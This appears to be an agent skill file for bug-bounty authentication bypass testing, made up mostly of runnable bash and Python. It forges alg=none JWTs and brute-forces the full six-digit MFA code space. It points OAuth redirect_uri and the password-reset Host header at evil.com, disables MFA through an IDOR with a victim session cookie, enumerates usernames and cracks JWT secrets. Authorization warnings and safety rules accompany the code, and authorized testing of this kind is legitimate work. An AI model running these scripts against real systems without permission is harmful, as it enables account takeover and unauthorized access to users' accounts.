---
name: bug-bounty-auth-bypass
description: Use for authentication bypass testing: JWT manipulation, session fixation, OAuth flaws, MFA bypass, password reset poisoning, and credential enumeration.
---

# Bug Bounty Authentication Bypass Testing

Use this skill for testing authentication mechanisms. **Requires explicit authorization.**

## JWT Testing

```bash
target="example.com"
slug="$(printf '%s' "$target" | tr '[:upper:]' '[:lower:]' | sed 's/[^a-z0-9._-]/_/g')"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"

# Decode JWT (no modification yet)
jwt="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
echo "$jwt" | cut -d'.' -f1 | base64 -d 2>/dev/null  # Header
echo "$jwt" | cut -d'.' -f2 | base64 -d 2>/dev/null  # Payload

# Test algorithm confusion (HS256 -> none)
# WARNING: Only test on authorized targets
python3 << 'EOF'
import base64, json, hmac

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Original JWT payload
payload = {"sub": "1234567890", "name": "John Doe", "iat": 1516239022, "admin": True}

# Create alg=none JWT
header = {"alg": "none", "typ": "JWT"}
header_b64 = base64url_encode(json.dumps(header).encode())
payload_b64 = base64url_encode(json.dumps(payload).encode())
fake_jwt = f"{header_b64}.{payload_b64}."
print(f"Alg=none JWT: {fake_jwt}")
EOF

# Test HS256/RS256 confusion
# If server uses RS256 (asymmetric), try signing with public key as HMAC secret
```

## Session Fixation

```bash
# Get session ID before login
session_before=$(curl -sk -c cookies.txt "https://$target/login" | \
    grep -oP 'session=[^;]+' | cut -d= -f2)

# Login with that session
curl -sk -b cookies.txt -X POST "https://$target/login" \
    -d "username=test&password=testpass"

# Check if session ID changed
session_after=$(grep session cookies.txt | cut -f2)

if [ "$session_before" = "$session_after" ]; then
    echo "SESSION FIXATION: Session ID not regenerated after login" >> "$BB_ROOT/vulns/session-fixation.txt"
fi
```

## OAuth/OIDC Testing

```bash
# Test redirect_uri manipulation
curl -sk "https://$target/oauth/authorize?client_id=APP&redirect_uri=https://evil.com&response_type=code&scope=read"

# Test state parameter bypass
curl -sk "https://$target/oauth/callback?code=AUTH_CODE&state=INVALID_STATE"

# Test scope escalation
curl -sk "https://$target/oauth/authorize?client_id=APP&scope=admin+read+write"

# Test account linking flaws
# Link OAuth account to existing, then try accessing original account
```

## MFA Bypass

```bash
# Test MFA code reuse
for i in {1..10}; do
    curl -sk -X POST "https://$target/mfa/verify" \
        -d "code=123456&session=SESSION_ID"
done

# Test MFA enumeration

> ⚠️ **WARNING**: MFA brute force generates up to 1,000,000 requests. Only use on explicitly authorized targets with rate-limit testing permission. Consider limiting range (e.g., {000000..000100}) for initial testing.

for code in {000000..999999}; do
    response=$(curl -sk -X POST "https://$target/mfa/verify" \
        -d "code=$code&session=SESSION_ID")
    echo "$response" | grep -qi "invalid\|incorrect" || \
        echo "Valid MFA code: $code" >> "$BB_ROOT/vulns/mfa-bypass.txt"
done

# Test MFA disabling via IDOR
curl -sk -X POST "https://$target/settings/mfa/disable" \
    -H "Cookie: session=VICTIM_SESSION"
```

## Password Reset Poisoning

```bash
# Test Host header poisoning
curl -sk -X POST "https://$target/password/reset" \
    -H "Host: evil.com" \
    -d "email=your-test-account@example.com"

# Test X-Forwarded-For header manipulation
curl -sk -X POST "https://$target/password/reset" \
    -H "X-Forwarded-For: 127.0.0.1" \
    -d "email=your-test-account@example.com"

# Check if reset link points to attacker's domain
```

## Credential Enumeration

```bash
# Test username enumeration via error messages
usernames=("admin" "test" "user" "administrator" "root")

for username in "${usernames[@]}"; do
    response=$(curl -sk -X POST "https://$target/login" \
        -d "username=$username&password=wrongpass")
    
    if echo "$response" | grep -qi "user not found\|invalid username"; then
        echo "Username exists: $username" >> "$BB_ROOT/vulns/user-enum.txt"
    elif echo "$response" | grep -qi "password\|incorrect"; then
        echo "Username exists (password error): $username" >> "$BB_ROOT/vulns/user-enum.txt"
    fi
done

# Test via timing differences
for username in "${usernames[@]}"; do
    start=$(date +%s%N)
    curl -sk -X POST "https://$target/login" \
        -d "username=$username&password=wrongpass" > /dev/null
    end=$(date +%s%N)
    diff=$(( (end - start) / 1000000 ))
    echo "$username: ${diff}ms" >> "$BB_ROOT/vulns/timing-enum.txt"
done
```

## JWT Secret Brute Force

```bash
# Only if weak secret suspected
# Use jwt_tool or custom script
jwt_tool "$jwt" -C -p /usr/share/wordlists/rockyou.txt

# Or test common secrets
secrets=("secret" "password" "123456" "jwt_secret" "your-256-bit-secret")

for secret in "${secrets[@]}"; do
    # Try signing with each secret, check if valid
    python3 -c "
import jwt, base64
try:
    decoded = jwt.decode('$jwt', '$secret', algorithms=['HS256'])
    print(f'Valid secret: $secret')
except:
    pass
" >> "$BB_ROOT/vulns/jwt-secret-found.txt"
done
```

## Authentication Bypass Checklist

- [ ] JWT algorithm confusion (none/HS256/RS256)
- [ ] JWT signature bypass
- [ ] JWT expiration bypass
- [ ] Session fixation
- [ ] Session not invalidated after logout
- [ ] OAuth redirect_uri manipulation
- [ ] OAuth state parameter bypass
- [ ] OAuth scope escalation
- [ ] MFA code reuse
- [ ] MFA enumeration
- [ ] Password reset poisoning
- [ ] Username enumeration
- [ ] Credential stuffing (only if authorized)
- [ ] Password policy bypass

## Auth Testing Tools

- `jwt_tool` - JWT testing
- `burpsuite` - Request interception
- `oauth2-test` - OAuth testing
- `nuclei` - Auth bypass templates
- Custom scripts for specific flows

## Safety Rules

1. **NEVER** test on real user accounts
2. **NEVER** brute force without explicit approval
3. **NEVER** bypass MFA on production without approval
4. **ALWAYS** use self-owned test accounts
5. **ALWAYS** document all test attempts
6. **STOP** after finding a bypass, don't exploit further
## Output Convention

All commands must save output to organized paths:

```bash
ts="$(date +%Y%m%d-%H%M%S)"
BB_ROOT="${BUGBOUNTY_ROOT:-$HOME/bugbounty/$slug}"
# stdout -> $BB_ROOT/<phase>/<tool>-$ts.txt
# stderr -> $BB_ROOT/logs/<tool>-$ts.err
```

Never dump raw tool output into chat context. Save to files, then read targeted excerpts.
